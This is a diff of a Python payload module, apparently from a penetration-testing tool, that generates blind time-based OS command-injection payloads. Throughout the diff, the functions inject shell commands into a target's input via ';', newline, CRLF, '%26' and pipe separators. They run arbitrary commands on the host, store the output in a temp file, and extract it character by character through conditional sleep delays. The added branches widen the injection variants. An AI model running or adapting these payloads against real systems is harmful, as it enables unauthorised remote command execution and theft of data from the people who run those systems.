@@ -26,6 +26,7 @@ The available "tempfile-based" payloads.
 Tempfile-based decision payload (check if host is vulnerable).
 """
 def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
+  payload = ""
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator in ("|", "||"):
       pipe = "|"
@@ -49,16 +50,23 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
       pass
 
   else:
-    if separator in (";", "%0a") :
+    if separator in (";", "%0a", "%0d%0a") :
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
-                "if [ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
-                "then sleep " + str(timesec) + separator +
-                "fi"
+                "sleep $((" + str(timesec) + "*(" + str(j) + "==${" + settings.RANDOM_VAR_GENERATOR + "1})))"
                 )
+    elif separator == "%26":
+      payload = (separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}&&" +
+                "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]&&" +
+                "sleep " + str(timesec)
+                )
+
     elif separator == _urllib.parse.quote("&&") :
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
@@ -70,20 +78,18 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 "sleep " + str(timesec)
                 )
       separator = _urllib.parse.unquote(separator)
-    elif separator == "||" :
+
+    elif separator in ("|", "||"):
       pipe = "|"
-      # Keep the leading pipe and "||" syntax; run the length check pipe-free in a subshell.
       payload = (pipe +
-                "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe +
-                "[ " + str(j) + " -ne $(" + settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + ";" +
-                "echo ${#" + settings.RANDOM_VAR_GENERATOR + "}) ] " + separator +
+                "[ " + str(j) + " -ne $(printf '%s' \"" + TAG + "\"" + pipe + "tee " + OUTPUT_TEXTFILE + pipe + "wc -c) ]" + "||" +
                 "sleep " + str(timesec)
                 )
     else:
       pass
 
     if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+      payload = checks.append_custom_marker(payload, separator)
 
   return payload
 
@@ -91,6 +97,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
 __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_interpreter(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
+  payload = ""
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
     if separator in ("|", "||"):
@@ -115,14 +122,12 @@ def decision_alter_interpreter(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http
       pass
 
   else:
-    if separator in (";", "%0a") :
+    if separator in (";", "%0a", "%0d%0a") :
       payload = (separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
-                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
-                "fi"
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep($((" + str(timesec) + "*(" + str(j) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                 )
     elif separator == _urllib.parse.quote("&&") :
       ampersand = _urllib.parse.quote("&")
@@ -134,19 +139,25 @@ def decision_alter_interpreter(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http
                 "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
-    elif separator == "||" :
+    elif separator == "%26":
+      payload = (separator +
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + settings.SINGLE_WHITESPACE +
+                "[ " + str(j) + " -eq " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
+                )
+    elif separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + settings.SINGLE_WHITESPACE +
                 # Find the length of the output, using readline().
-                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + separator +
+                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
     else:
       pass
 
     if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+      payload = checks.append_custom_marker(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
@@ -156,11 +167,16 @@ Build a raw shell numeric comparison for false-positive checks; Unix-only.
 def condition_check(separator, condition, timesec, http_request_method):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     return None
-  if separator in (";", "%0a"):
+  if separator in (";", "%0a", "%0d%0a"):
     payload = (separator +
-              "if [ " + condition + " ]" + separator +
-              "then sleep " + str(timesec) + separator +
-              "fi"
+              "[ " + condition + " ]" + separator +
+              settings.RANDOM_VAR_GENERATOR + "=$?" + separator +
+              "sleep $((" + str(timesec) + "*(" + settings.RANDOM_VAR_GENERATOR + "==0)))"
+              )
+  elif separator == "%26":
+    payload = (separator +
+              "[ " + condition + " ]" + "&&" +
+              "sleep " + str(timesec)
               )
   elif separator == _urllib.parse.quote("&&"):
     payload = (_urllib.parse.quote("&") +
@@ -168,17 +184,17 @@ def condition_check(separator, condition, timesec, http_request_method):
               "[ " + condition + " ]" + separator +
               "sleep " + str(timesec)
               )
-  elif separator == "||":
+  elif separator in ("|", "||"):
     pipe = "|"
     payload = (pipe +
-              "[ ! " + condition + " ]" + separator +
+              "[ ! " + condition + " ]" + "||" +
               "sleep " + str(timesec)
               )
   else:
     return None
 
   if settings.CUSTOM_INJECTION_MARKER:
-    payload = payload + separator
+    payload = checks.append_custom_marker(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
@@ -186,6 +202,8 @@ def condition_check(separator, condition, timesec, http_request_method):
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method, operator="-le"):
+  payload = ""
+  inverted_operator = "-gt" if operator == "-le" else "-ne"
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator in ("|", "||"):
       pipe = "|"
@@ -223,23 +241,32 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       pass
   else:
     settings.USER_APPLIED_CMD = cmd
-    if separator in (";", "%0a") :
+    if separator in (";", "%0a", "%0d%0a") :
+      arith_operator = "<=" if operator == "-le" else "=="
       payload = (separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr '" + settings.END_LINE.ESCAPED_LF + "' ' ' < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                # Quoted - an unquoted "$VAR" here word-splits on internal whitespace,
-                # collapsing runs of spaces/tabs in the command's real output.
-                "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\" > " + OUTPUT_TEXTFILE + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr '" + settings.END_LINE.ESCAPED_LF + "' '\\040' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+                "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\" >" + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
-                # Use -le for bisection; rewrite the payload each time to keep repeated matches harmless.
-                "if [ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
-                "then sleep " + str(timesec) + separator +
+                "sleep $((" + str(timesec) + "*(" + str(j) + arith_operator + settings.RANDOM_VAR_GENERATOR + "1)))" + separator +
                 # Transform to ASCII
-                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1 < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "echo $" + settings.RANDOM_VAR_GENERATOR + "1 > " + OUTPUT_TEXTFILE + separator +
-                "fi"
+                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+                "echo $" + settings.RANDOM_VAR_GENERATOR + "1 >" + OUTPUT_TEXTFILE
                 )
+    elif separator == "%26":
+      payload = (separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "&&" + " tr '" + settings.END_LINE.ESCAPED_LF + "' '\\040' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
+                "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\" >" + OUTPUT_TEXTFILE + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}&&" +
+                "[ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]&&" +
+                "sleep " + str(timesec) + "&&" +
+                # Transform to ASCII
+                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
+                "echo $" + settings.RANDOM_VAR_GENERATOR + "1 >" + OUTPUT_TEXTFILE
+                )
+
     elif separator == _urllib.parse.quote("&&") :
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
@@ -249,28 +276,26 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
-                # -le (not -eq) makes this bisectable like time-based's length check.
                 "[ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                 "sleep " + str(timesec) + separator +
                 # Transform to ASCII
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "echo $" + settings.RANDOM_VAR_GENERATOR + "1" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE
                 )
-    elif separator == "||" :
+
+    elif separator in ("|", "||"):
       pipe = "|"
       cmd = cmd.rstrip()
       cmd = checks.add_command_substitution(cmd)
       payload = (pipe +
-                cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe +
-                "[ " + str(j) + " -ne $(" + settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + ";" +
-                "echo ${#" + settings.RANDOM_VAR_GENERATOR + "}) ]" + separator +
+                "[ " + str(j) + settings.SINGLE_WHITESPACE + inverted_operator + " $(" + cmd + pipe + "tee " + OUTPUT_TEXTFILE + pipe + "wc -c) ]" + "||" +
                 "sleep " + str(timesec)
                 )
     else:
       pass
 
     if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+      payload = checks.append_custom_marker(payload, separator)
 
   return payload
 
@@ -278,6 +303,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
 __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_interpreter(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
+  payload = ""
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
     if separator in ("|", "||"):
@@ -306,14 +332,12 @@ def cmd_execution_alter_interpreter(separator, cmd, j, OUTPUT_TEXTFILE, timesec,
       pass
   else:
     settings.USER_APPLIED_CMD = cmd
-    if separator in (";", "%0a") :
+    if separator in (";", "%0a", "%0d%0a") :
       payload = (separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output, using readline().
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
-                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
-                "fi"
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep($((" + str(timesec) + "*(" + str(j) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                 )
     elif separator == _urllib.parse.quote("&&") :
       ampersand = _urllib.parse.quote("&")
@@ -325,18 +349,24 @@ def cmd_execution_alter_interpreter(separator, cmd, j, OUTPUT_TEXTFILE, timesec,
                 "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ] " + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
-    elif separator == "||" :
+    elif separator == "%26":
+      payload = (separator +
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + settings.SINGLE_WHITESPACE +
+                "[ " + str(j) + " -eq " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
+                )
+    elif separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX + settings.SINGLE_WHITESPACE +
-                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + separator +
-                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
+                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\") ] " + "||" +
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
     else:
       pass
 
     if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+      payload = checks.append_custom_marker(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
@@ -344,8 +374,9 @@ def cmd_execution_alter_interpreter(separator, cmd, j, OUTPUT_TEXTFILE, timesec,
 Get the execution output, of shell execution.
 """
 def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
-  # Use bisection by default; validation re-probes the resolved value with equality.
+  payload = ""
   win_operator = "GEQ" if operator == "-le" else "EQU"
+  inverted_operator = "-gt" if operator == "-le" else "-ne"
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator in ("|", "||"):
       pipe = "|"
@@ -366,13 +397,12 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
     else:
       pass
   else:
-    if separator in (";", "%0a") :
+    if separator in (";", "%0a", "%0d%0a") :
+      arith_operator = "<=" if operator == "-le" else "=="
       payload = (separator +
                 # Use space as delimiter
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
-                "then sleep " + str(timesec) + separator +
-                "fi"
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "awk '{print$" + str(num_of_chars) + "}' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+                "sleep $((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + settings.RANDOM_VAR_GENERATOR + ")))"
                 )
     elif separator == _urllib.parse.quote("&&") :
       ampersand = _urllib.parse.quote("&")
@@ -384,22 +414,22 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 "sleep " + str(timesec)
                 )
       separator = _urllib.parse.unquote(separator)
-    elif separator == "||" :
+    elif separator == "%26":
+      payload = (separator +
+                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + " $(awk '{print$" + str(num_of_chars) + "}' <" + OUTPUT_TEXTFILE + ") ]" + "&&" +
+                "sleep " + str(timesec)
+                )
+    elif separator in ("|", "||"):
       pipe = "|"
-      # Keep the leading pipe syntax; run extraction pipe-free in a self-contained subshell.
-      qmarks = "?" * (num_of_chars - 1)
       payload = (pipe +
-                "[ " + str(ascii_char) + " -gt $(" + settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + ";" +
-                settings.RANDOM_VAR_GENERATOR + "=${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "};" +
-                settings.RANDOM_VAR_GENERATOR + "=${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"};" +
-                "printf '%d' \"'${" + settings.RANDOM_VAR_GENERATOR + "}\") ] " + separator +
+                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + " $(printf '%d' \"'$(cut -c" + str(num_of_chars) + " " + OUTPUT_TEXTFILE + ")\") ]" + "||" +
                 "sleep " + str(timesec)
                 )
     else:
       pass
 
     if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+      payload = checks.append_custom_marker(payload, separator)
 
   return payload
 
@@ -407,8 +437,10 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
 __Warning__: The alternative shells are still experimental.
 """
 def get_char_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
-  # Same bisection comparison by default as get_char() - validation re-probes with an equality operator.
+  payload = ""
   win_operator = "GEQ" if operator == "-le" else "EQU"
+  inverted_operator = "-gt" if operator == "-le" else "-ne"
+  arith_operator = "<=" if operator == "-le" else "=="
   if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(ord(file.read().strip()[" + str(num_of_chars - 1) + "][0])); exit(0)\""
     if separator in ("|", "||"):
@@ -432,12 +464,10 @@ def get_char_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_c
       pass
 
   else:
-    if separator in (";", "%0a") :
+    if separator in (";", "%0a", "%0d%0a") :
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + "${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
-                "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
-                "fi"
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + "${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                 )
     elif separator == _urllib.parse.quote("&&") :
       ampersand = _urllib.parse.quote("&")
@@ -448,18 +478,22 @@ def get_char_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_c
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
       separator = _urllib.parse.unquote(separator)
-    elif separator == "||" :
+    elif separator == "%26":
+      payload = (separator +
+                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + " ]" + "&&" +
+                settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
+                )
+    elif separator in ("|", "||"):
       pipe = "|"
-      # Inverted to -gt (like get_char()'s "||" branch): "||" only runs sleep when this test fails.
       payload = (pipe +
-                "[ " + str(ascii_char) + " -gt " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\") ] " + separator +
+                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + settings.SINGLE_WHITESPACE + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\") ] " + "||" +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX
                 )
     else:
       pass
 
     if settings.CUSTOM_INJECTION_MARKER:
-      payload = payload + separator
+      payload = checks.append_custom_marker(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
@@ -467,6 +501,7 @@ def get_char_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_c
 Get the execution output, of shell execution.
 """
 def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):
+  payload = ""
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator in ("|", "||"):
       pipe = "|"
@@ -488,12 +523,10 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
       pass
 
   else:
-    if separator in (";", "%0a") :
+    if separator in (";", "%0a", "%0d%0a") :
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -c1-2 " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(ord(str(ascii_char))) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
-                "then sleep " + str(timesec) + separator +
-                "fi"
+                "sleep $((" + str(timesec) + "*(" + str(ord(str(ascii_char))) + "==${" + settings.RANDOM_VAR_GENERATOR + "})))"
                 )
     elif separator == _urllib.parse.quote("&&") :
       ampersand = _urllib.parse.quote("&")
@@ -504,17 +537,22 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
                 "sleep " + str(timesec)
                 )
       separator = _urllib.parse.unquote(separator)
-    elif separator == "||" :
+    elif separator == "%26":
+      payload = (separator +
+                "[ " + str(ord(str(ascii_char))) + " -eq $(cut -c1-2 " + OUTPUT_TEXTFILE + ") ]" + "&&" +
+                "sleep " + str(timesec)
+                )
